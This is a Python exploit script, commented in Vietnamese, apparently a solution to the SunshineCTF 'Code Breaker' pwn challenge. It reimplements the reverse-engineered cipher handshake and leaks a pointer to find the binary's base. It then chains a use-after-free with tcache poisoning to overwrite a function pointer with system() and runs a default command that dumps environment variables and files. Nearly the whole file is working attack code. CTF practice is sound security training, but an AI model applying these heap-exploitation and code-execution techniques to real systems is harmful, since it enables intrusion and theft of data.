"""Code Breaker (SunshineCTF, crypto/pwn 499) — client cho giao thức "proprietary cipher".

Đảo ngược từ code_breaker:
  keystream(off, i) = SBOX[(off + i + state[i & 15]) & 0xff]
  hai bộ đếm độc lập: recv_off (server giải mã) và send_off (server mã hoá),
  mỗi cái tăng đúng bằng độ dài message vừa xử lý.

  Handshake:
    1. server -> [01][key16]            RAW (gửi bằng send_raw, chưa có state)
    2. client -> [02][peer16]           RAW
    3. client -> [03][check16]          MÃ HOÁ với recv_off=0
       check16[i] = state[i] ^ SBOX[state[(i+5)&15]]
    4. server -> [04][00]               MÃ HOÁ với send_off=0

Lệnh (payload đã mã hoá): 10 PUT, 11 GET, 12 WRITE, 13 FREE, 14 ALIAS, 15 RUN, 16 INFO.

Dùng: python client.py <stage>   với stage trong: handshake | info | full
"""
import re
import socket
import struct
import sys

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST, PORT = "chal.sunshinectf.games", 26005
BIN = "files/code_breaker"


def load_sbox():
    d = open(BIN, "rb").read()
    # .rodata: vaddr 0x2000 = file offset 0x2000; S-box tại 0x2040
    return d[0x2040:0x2040 + 256]


SBOX = load_sbox()
assert len(SBOX) == 256 and sorted(SBOX) == list(range(256)), "S-box không phải hoán vị"


def rol8(v, n):
    return ((v << n) | (v >> (8 - n))) & 0xFF


def key_schedule(key16, peer16):
    window = key16 + peer16
    state = bytearray(16)
    for outer in range(4):
        for i in range(16):
            x = window[(i + 8 * outer) & 0x1F] ^ state[i]
            x = SBOX[x]
            x ^= window[3 * outer + i]
            state[i] = rol8(x, 3)
    return bytes(state)


def check_bytes(state):
    # 1860: window[i] = state[(i+5)&15] ^ SBOX[state[i]]
    return bytes(state[(i + 5) & 15] ^ SBOX[state[i]] for i in range(16))


class Channel:
    """out_off = bộ đếm phía server dùng để GIẢI MÃ tin ta gửi ([0x42c0]).
       in_off  = bộ đếm phía server dùng để MÃ HOÁ tin nó gửi lại ([0x42c4]).
       Mỗi cái tăng đúng bằng độ dài phần thân của message tương ứng."""

    def __init__(self, sock):
        self.s = sock
        self.out_off = 0
        self.in_off = 0
        self.state = None

    def _raw_recv(self, n):
        buf = b""
        while len(buf) < n:
            c = self.s.recv(n - len(buf))
            if not c:
                raise EOFError("mất kết nối")
            buf += c
        return buf

    def recv_raw(self):
        ln = struct.unpack(">H", self._raw_recv(2))[0]
        return self._raw_recv(ln)

    def send_raw(self, body):
        self.s.sendall(struct.pack(">H", len(body)) + body)

    def ks(self, off, n):
        return bytes(SBOX[(off + i + self.state[i & 15]) & 0xFF] for i in range(n))

    def recv(self):
        b = self.recv_raw()
        out = bytes(x ^ y for x, y in zip(b, self.ks(self.in_off, len(b))))
        self.in_off += len(b)
        return out

    def send(self, body):
        out = bytes(x ^ y for x, y in zip(body, self.ks(self.out_off, len(body))))
        self.out_off += len(body)
        self.send_raw(out)

    def cmd(self, body, read=True):
        self.send(body)
        return self.recv() if read else None


def handshake(s):
    ch = Channel(s)
    msg = ch.recv_raw()
    assert msg[0] == 0x01 and len(msg) == 17, "handshake 1 lạ: %s" % msg.hex()
    key = msg[1:]
    peer = bytes(range(16))                       # 16 byte ta tự chọn
    state = key_schedule(key, peer)
    ch.state = state
    ch.send_raw(b"\x02" + peer)
    ch.send(b"\x03" + check_bytes(state))
    rep = ch.recv()
    print("[*] key   = %s" % key.hex())
    print("[*] state = %s" % state.hex())
    print("[*] handshake reply = %s  %s" % (rep.hex(), "(thành công)" if rep[:2] == b"\x04\x00" else "(THẤT BẠI)"))
    return ch, (rep[:2] == b"\x04\x00")


def main():
    stage = sys.argv[1] if len(sys.argv) > 1 else "handshake"
    s = socket.create_connection((HOST, PORT), timeout=20)
    ch, ok = handshake(s)
    if not ok:
        return 1

    if stage == "handshake":
        return 0

    if stage in ("info", "full"):
        r = ch.cmd(b"\x16")
        print("[*] INFO -> %r" % r[:8])
        dump = r[2:]
        fnptr = struct.unpack("<Q", dump[:8])[0]
        base = fnptr - 0x1390
        print("[+] fnptr @0x40c0 = 0x%x  ->  base = 0x%x" % (fnptr, base))
        if base & 0xFFF:
            print("[-] base không page-aligned, đoán sai")
            return 1
        if stage == "info":
            print("[*] dump 64 byte đầu BSS: %s" % dump[:64].hex())
            return 0

    # ---- full: UAF -> Poison tcache -> ghi system vào con trỏ hàm 0x40c0 ----
    SYSTEM_PLT = base + 0x1150
    FNPG = base + 0x40C0
    S = 0x100

    def put(slot, size, val):
        return ch.cmd(b"\x10" + bytes([slot]) + struct.pack(">H", size) + val)

    def get(slot):
        return ch.cmd(b"\x11" + bytes([slot]))

    def write(slot, off, data):
        return ch.cmd(b"\x12" + bytes([slot]) + struct.pack(">H", off) + data)

    def free(slot):
        return ch.cmd(b"\x13" + bytes([slot]))

    def alias(a, b):
        return ch.cmd(b"\x14" + bytes([a, b]))

    def show(tag, r):
        st = r[1] if len(r) > 1 else None
        print("    %-14s -> %s  status=%s" % (tag, r[:12].hex(), "OK" if st == 0 else hex(st) if st else r[:2].hex()))
        return r

    print("[*] hai chunk cùng bin, để forged nằm ở vị trí pop thứ hai")
    put(1, S, b"A" * S)          # P1
    put(2, S, b"B" * S)          # P2 = P1 + 0x110
    alias(0, 2)                  # slot0 giữ alias sống tới P2
    free(2)                      # bin = [P2], P2[0:8] = P2>>12
    g2 = ch.cmd(b"\x11\x00")
    t = struct.unpack("<Q", g2[4:12])[0]
    print("[*] P2>>12 = 0x%x  (P2 ~ 0x%x)" % (t, t << 12))
    alias(3, 1)                  # slot3 alias sống tới P1
    free(1)                      # bin = [P1 -> P2], counts = 2
    forged = t ^ FNPG            # P1 và P2 cùng trang nên P1>>12 == t
    show("poison", write(3, 8, struct.pack("<Q", forged)))
    put(4, S, b"C" * S)                                  # pop P1 -> head = FNPG
    put(5, S, struct.pack("<Q", SYSTEM_PLT) + b"\x00" * (S - 8))   # pop FNPG
    d2 = ch.cmd(b"\x16")[2:]
    now = struct.unpack("<Q", d2[:8])[0]
    print("[*] [0x40c0] = 0x%x  (kỳ vọng 0x%x)" % (now, SYSTEM_PLT))
    if now != SYSTEM_PLT:
        print("[-] ghi không landing")
        return 1

    # system() ghi trực tiếp vào fd 1 => dữ liệu thô, không có length-prefix
    shell = sys.argv[2] if len(sys.argv) > 2 else \
        "ls -la /ctf 2>&1; env; cat /ctf/* 2>&1 | head -c 400"
    ch.send(b"\x15" + shell.encode() + b"\n")
    out = b""
    ch.s.settimeout(4.0)
    while True:
        try:
            c = ch.s.recv(4096)
        except (socket.timeout, OSError):
            break
        if not c:
            break
        out += c
    print("---- kết quả ----")
    sys.stdout.write(out.decode(errors="replace"))
    print()
    ch.s.close()
    m2 = re.search(rb"sun\{[^}\n]*\}", out)
    if m2:
        open("flag.txt", "wb").write(m2.group(0) + b"\n")
        print("[+] FLAG: %s" % m2.group(0).decode())
        return 0
    print("[-] chưa thấy flag")
    return 1


if __name__ == "__main__":
    sys.exit(main())
